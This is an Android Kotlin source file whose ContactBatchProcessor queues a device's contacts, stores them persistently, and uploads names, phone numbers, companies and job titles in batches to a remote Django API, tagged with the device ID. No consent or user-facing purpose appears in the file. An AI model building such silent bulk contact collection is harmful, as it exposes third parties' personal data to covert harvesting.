package com.example.fast.util

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.example.fast.model.Contact
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.writeInternalFile
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * ContactBatchProcessor
 * 
 * Optimizes contact processing by batching contacts together before uploading to Firebase.
 * This prevents Firebase overload when syncing large volumes of contacts (e.g., 5000 contacts).
 * 
 * Features:
 * - Batches contacts: Uploads 100 contacts at a time
 * - Processes in background thread
 * - Prevents Firebase overload
 * - Persistent storage: Queued contacts saved to JSON file (survives app restarts)
 * - Priority processing: Newest contacts processed first (by lastContacted timestamp or id)
 * - One batch at a time: Processes one batch, waits for completion, then processes next batch
 * 
 * Priority Processing:
 * - Contacts sorted by lastContacted timestamp descending (newest first)
 * - Falls back to id comparison if lastContacted is null
 * - Processes batches of 100 contacts at a time
 * - New contacts arriving during upload are prioritized in next batch
 */
object ContactBatchProcessor {
    
    private const val TAG = "ContactBatchProcessor"
    private const val BATCH_SIZE = 100 // Upload 100 contacts at once
    private const val BATCH_TIMEOUT_MS = 5 * 60 * 1000L // 5 minutes max wait
    private const val STORAGE_FILE_NAME = "queued_contacts.json" // JSON file for persistent storage
    
    private val contactQueue = ConcurrentLinkedQueue<QueuedContact>()
    private val handler = Handler(Looper.getMainLooper())
    private var batchTimer: Runnable? = null
    private val processingLock = Any()
    private var isProcessing = false
    private var isInitialized = false // Track if initialized from storage
    
    // Gson instance for JSON parsing
    private val gson: Gson = GsonBuilder()
        .setPrettyPrinting()
        .create()
    
    // Deduplication: Track recently uploaded contacts by phone number
    // Key: phone number, Value: upload timestamp
    private val uploadedContactsCache = ConcurrentHashMap<String, Long>()
    
    data class QueuedContact(
        val contact: Contact,
        val timestamp: Long = System.currentTimeMillis() // Queue timestamp for priority
    )
    
    /**
     * Data class for JSON file structure
     */
    private data class ContactStorage(
        val contacts: List<Contact>,
        val lastUpdated: Long
    )
    
    /**
     * Load queued contacts from JSON file
     * Called on app startup to recover contacts from previous session
     */
    fun initializeFromStorage(context: Context) {
        synchronized(processingLock) {
            if (isInitialized) {
                Log.d(TAG, "Already initialized from storage, skipping")
                return
            }
            
            try {
                val jsonString = context.readInternalFile(STORAGE_FILE_NAME)
                if (jsonString.isBlank()) {
                    Log.d(TAG, "No stored contacts found, starting fresh")
                    isInitialized = true
                    return
                }
                
                val storage: ContactStorage = gson.fromJson(jsonString, ContactStorage::class.java)
                
                // Sort contacts by lastContacted timestamp descending (newest first) for priority processing
                val sortedContacts = storage.contacts.sortedWith(compareByDescending<Contact> { 
                    it.lastContacted ?: 0L 
                }.thenByDescending { it.id })
                
                // Add all stored contacts to queue (newest first)
                sortedContacts.forEach { contact ->
                    val queuedContact = QueuedContact(contact = contact)
                    contactQueue.offer(queuedContact)
                    // Add to cache to prevent re-queuing
                    if (contact.phoneNumber.isNotBlank()) {
                        uploadedContactsCache[contact.phoneNumber] = 0L
                    }
                }
                
                isInitialized = true
                Log.d(TAG, "✅ Loaded ${sortedContacts.size} contacts from storage (sorted: newest first, last updated: ${java.util.Date(storage.lastUpdated)})")
                
                // Schedule batch processing if queue is not empty
                if (contactQueue.isNotEmpty() && !isProcessing && batchTimer == null) {
                    scheduleBatchProcessing(context)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error loading contacts from storage, starting fresh", e)
                isInitialized = true
            }
        }
    }
    
    /**
     * Save queued contacts to JSON file
     * Persists contacts to disk for offline recovery
     * Stores in sorted order (newest first) for priority processing
     */
    private fun saveToStorage(context: Context) {
        Thread {
            try {
                val contactsList = mutableListOf<Contact>()
                
                // Copy all contacts from queue
                contactQueue.forEach { queuedContact ->
                    contactsList.add(queuedContact.contact)
                }
                
                // Sort by lastContacted timestamp descending (newest first) for priority processing on next load
                contactsList.sortWith(compareByDescending<Contact> { 
                    it.lastContacted ?: 0L 
                }.thenByDescending { it.id })
                
                val storage = ContactStorage(
                    contacts = contactsList,
                    lastUpdated = System.currentTimeMillis()
                )
                
                val jsonString = gson.toJson(storage)
                context.writeInternalFile(STORAGE_FILE_NAME, jsonString)
                
                Log.d(TAG, "💾 Saved ${contactsList.size} contacts to storage (sorted: newest first)")
            } catch (e: Exception) {
                Log.e(TAG, "Error saving contacts to storage", e)
            }
        }.start()
    }
    
    /**
     * Clear storage file
     * Called after successful upload of all contacts
     */
    private fun clearStorage(context: Context) {
        Thread {
            try {
                context.writeInternalFile(STORAGE_FILE_NAME, "")
                Log.d(TAG, "🗑️ Cleared storage file")
            } catch (e: Exception) {
                Log.e(TAG, "Error clearing storage file", e)
            }
        }.start()
    }
    
    /**
     * Queue contacts for batch upload
     * Contacts are stored in JSON file first, then uploaded in batches of 100
     * 
     * @param context Application context
     * @param contacts List of contacts to queue
     */
    fun queueContacts(
        context: Context,
        contacts: List<Contact>
    ) {
        if (contacts.isEmpty()) {
            Log.d(TAG, "No contacts to queue")
            return
        }
        
        // Filter out contacts without phone numbers and duplicates
        val contactsToQueue = contacts.filter { contact ->
            contact.phoneNumber.isNotBlank() && 
            !uploadedContactsCache.containsKey(contact.phoneNumber)
        }
        
        if (contactsToQueue.isEmpty()) {
            Log.d(TAG, "All contacts are duplicates or have no phone number, skipping")
            return
        }
        
        // Add contacts to queue
        contactsToQueue.forEach { contact ->
            val queuedContact = QueuedContact(contact = contact)
            contactQueue.offer(queuedContact)
        }
        
        Log.d(TAG, "Queued ${contactsToQueue.size} contacts (queue size: ${contactQueue.size})")
        
        // Save to persistent storage
        saveToStorage(context)
        
        // Check if we're currently processing a batch
        synchronized(processingLock) {
            if (isProcessing) {
                // If upload is in progress, new contacts will be prioritized in next batch
                // (they'll be sorted by lastContacted timestamp when processing next batch)
                Log.d(TAG, "Upload in progress - new contacts will be prioritized in next batch (newest first)")
                return
            }
            
            // Schedule batch processing if not already scheduled
            if (batchTimer == null) {
                scheduleBatchProcessing(context)
            }
            
            // Check if batch size reached (100 contacts)
            if (contactQueue.size >= BATCH_SIZE) {
                Log.d(TAG, "Batch size reached ($BATCH_SIZE), triggering immediate batch upload (newest first)")
                processBatch(context)
            }
        }
    }
    
    /**
     * Schedule batch processing with timeout (5 minutes)
     */
    private fun scheduleBatchProcessing(context: Context) {
        batchTimer = Runnable {
            synchronized(processingLock) {
                if (!isProcessing && contactQueue.isNotEmpty()) {
                    Log.d(TAG, "Batch timeout reached (${BATCH_TIMEOUT_MS / 1000}s), processing batch")
                    processBatch(context)
                }
                batchTimer = null
            }
        }
        
        handler.postDelayed(batchTimer!!, BATCH_TIMEOUT_MS)
        Log.d(TAG, "Scheduled batch processing in ${BATCH_TIMEOUT_MS / 1000} seconds")
    }
    
    /**
     * Process batch of contacts and upload to Firebase
     * Processes newest contacts first (sorted by lastContacted timestamp)
     */
    private fun processBatch(context: Context) {
        synchronized(processingLock) {
            if (isProcessing) {
                Log.d(TAG, "Batch processing already in progress, skipping")
                return
            }
            
            if (contactQueue.isEmpty()) {
                Log.d(TAG, "Contact queue is empty, nothing to process")
                return
            }
            
            isProcessing = true
        }
        
        // Cancel batch timer
        batchTimer?.let {
            handler.removeCallbacks(it)
            batchTimer = null
        }
        
        // Process in background thread
        Thread {
            try {
                // Collect all contacts from queue first
                val allContacts = mutableListOf<QueuedContact>()
                while (contactQueue.isNotEmpty()) {
                    val queuedContact = contactQueue.poll()
                    if (queuedContact != null) {
                        allContacts.add(queuedContact)
                    }
                }
                
                if (allContacts.isEmpty()) {
                    synchronized(processingLock) {
                        isProcessing = false
                    }
                    return@Thread
                }
                
                // Sort by lastContacted timestamp descending (newest first) for priority processing
                allContacts.sortWith(compareByDescending<QueuedContact> { 
                    it.contact.lastContacted ?: 0L 
                }.thenByDescending { it.contact.id })
                
                // Take the first 100 contacts (newest ones)
                val contactsToProcess = allContacts.take(BATCH_SIZE)
                
                // Put remaining contacts back in queue (will be processed in next batch)
                allContacts.drop(BATCH_SIZE).forEach { queuedContact ->
                    contactQueue.offer(queuedContact)
                }
                
                Log.d(TAG, "🔄 Processing batch of ${contactsToProcess.size} contacts (newest first priority)")
                if (allContacts.size > BATCH_SIZE) {
                    Log.d(TAG, "📦 ${allContacts.size - BATCH_SIZE} contacts remaining for next batch")
                }
                
                // Get device ID
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                
                // Convert contacts to Django format
                val contactsList = convertContactsToDjangoFormat(
                    contactsToProcess.map { it.contact }
                )
                
                // Upload batch to Django API only (no Firebase)
                if (contactsList.isNotEmpty()) {
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            DjangoApiHelper.syncContacts(deviceId, contactsList)
                            Log.d(TAG, "✅ Successfully uploaded batch of ${contactsList.size} contacts to Django")
                            
                            // Mark all uploaded contacts in cache to prevent duplicates
                            contactsToProcess.forEach { queuedContact ->
                                if (queuedContact.contact.phoneNumber.isNotBlank()) {
                                    uploadedContactsCache[queuedContact.contact.phoneNumber] = System.currentTimeMillis()
                                }
                            }
                            
                            // Update persistent storage (remove uploaded contacts)
                            if (contactQueue.isEmpty()) {
                                clearStorage(context)
                            } else {
                                saveToStorage(context)
                            }
                            
                            // Schedule next batch if queue is not empty
                            synchronized(processingLock) {
                                isProcessing = false
                                if (contactQueue.isNotEmpty()) {
                                    scheduleBatchProcessing(context)
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Failed to upload contact batch to Django, re-queuing", e)
                            
                            // Re-queue contacts on failure
                            contactsToProcess.forEach { queuedContact ->
                                contactQueue.offer(queuedContact)
                            }
                            
                            // Update persistent storage (re-queue failed contacts)
                            saveToStorage(context)
                            
                            // Retry after delay
                            synchronized(processingLock) {
                                isProcessing = false
                                scheduleBatchProcessing(context)
                            }
                        }
                    }
                } else {
                    Log.d(TAG, "No contacts to upload after filtering")
                    synchronized(processingLock) {
                        isProcessing = false
                        if (contactQueue.isNotEmpty()) {
                            scheduleBatchProcessing(context)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing contact batch", e)
                synchronized(processingLock) {
                    isProcessing = false
                    if (contactQueue.isNotEmpty()) {
                        scheduleBatchProcessing(context)
                    }
                }
            }
        }.start()
    }
    
    /**
     * Convert contacts to Django format (list of maps)
     */
    private fun convertContactsToDjangoFormat(contacts: List<Contact>): List<Map<String, Any?>> {
        val contactsList = mutableListOf<Map<String, Any?>>()
        
        contacts.forEach { contact ->
            try {
                // Only sync contacts with phone numbers
                if (contact.phoneNumber.isNotBlank()) {
                    val contactData = mutableMapOf<String, Any?>(
                        "name" to contact.name,
                        "phone_number" to contact.phoneNumber,
                        "last_contacted" to contact.lastContacted
                    )
                    
                    // Add optional fields if available
                    contact.displayName?.let { contactData["display_name"] = it }
                    contact.company?.let { contactData["company"] = it }
                    contact.jobTitle?.let { contactData["job_title"] = it }
                    
                    contactsList.add(contactData)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error converting contact to Django format", e)
            }
        }
        
        return contactsList
    }
    
    /**
     * Convert contacts to Firebase format
     * Uses same structure as FirebaseSyncHelper for consistency
     * NOTE: This method is kept for backward compatibility but not used anymore
     */
    private fun convertContactsToFirebaseFormat(contacts: List<Contact>): Map<String, Map<String, Any?>> {
        val contactsMap = mutableMapOf<String, Map<String, Any?>>()
        
        contacts.forEach { contact ->
            try {
                // Only sync contacts with phone numbers
                if (contact.phoneNumber.isNotBlank()) {
                    val contactData = mutableMapOf<String, Any?>(
                        "id" to contact.id,
                        "name" to contact.name,
                        "displayName" to contact.displayName,
                        "phoneNumber" to contact.phoneNumber,
                        "photoUri" to contact.photoUri,
                        "thumbnailUri" to contact.thumbnailUri,
                        "company" to contact.company,
                        "jobTitle" to contact.jobTitle,
                        "department" to contact.department,
                        "birthday" to contact.birthday,
                        "anniversary" to contact.anniversary,
                        "notes" to contact.notes,
                        "lastContacted" to contact.lastContacted,
                        "timesContacted" to contact.timesContacted,
                        "isStarred" to contact.isStarred,
                        "nickname" to contact.nickname,
                        "phoneticName" to contact.phoneticName
                    )
                    
                    // Add phones array
                    if (contact.phones.isNotEmpty()) {
                        contactData["phones"] = contact.phones.map { phone ->
                            mapOf(
                                "number" to phone.number,
                                "type" to phone.type,
                                "typeLabel" to phone.typeLabel,
                                "label" to phone.label,
                                "isPrimary" to phone.isPrimary
                            )
                        }
                    }
                    
                    // Add emails array
                    if (contact.emails.isNotEmpty()) {
                        contactData["emails"] = contact.emails.map { email ->
                            mapOf(
                                "address" to email.address,
                                "type" to email.type,
                                "typeLabel" to email.typeLabel,
                                "label" to email.label,
                                "isPrimary" to email.isPrimary
                            )
                        }
                    }
                    
                    // Add addresses array
                    if (contact.addresses.isNotEmpty()) {
                        contactData["addresses"] = contact.addresses.map { address ->
                            mapOf(
                                "street" to address.street,
                                "city" to address.city,
                                "region" to address.region,
                                "postcode" to address.postcode,
                                "country" to address.country,
                                "formattedAddress" to address.formattedAddress,
                                "type" to address.type,
                                "typeLabel" to address.typeLabel
                            )
                        }
                    }
                    
                    // Add websites array
                    if (contact.websites.isNotEmpty()) {
                        contactData["websites"] = contact.websites
                    }
                    
                    // Add IM accounts array
                    if (contact.imAccounts.isNotEmpty()) {
                        contactData["imAccounts"] = contact.imAccounts.map { im ->
                            mapOf(
                                "data" to im.data,
                                "protocol" to im.protocol,
                                "protocolLabel" to im.protocolLabel,
                                "customProtocol" to im.customProtocol
                            )
                        }
                    }
                    
                    contactsMap[contact.phoneNumber] = contactData
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error converting contact", e)
            }
        }
        
        return contactsMap
    }
    
    /**
     * Force process any pending contacts immediately
     * Useful for testing or when app is closing
     */
    fun flush(context: Context) {
        synchronized(processingLock) {
            if (contactQueue.isNotEmpty() && !isProcessing) {
                Log.d(TAG, "Flushing ${contactQueue.size} pending contacts")
                processBatch(context)
            }
        }
    }
    
    /**
     * Get current queue size (for monitoring)
     */
    fun getQueueSize(): Int = contactQueue.size
    
    /**
     * Clear all queued contacts (use with caution)
     */
    fun clearQueue() {
        contactQueue.clear()
        batchTimer?.let { handler.removeCallbacks(it) }
        batchTimer = null
    }
}
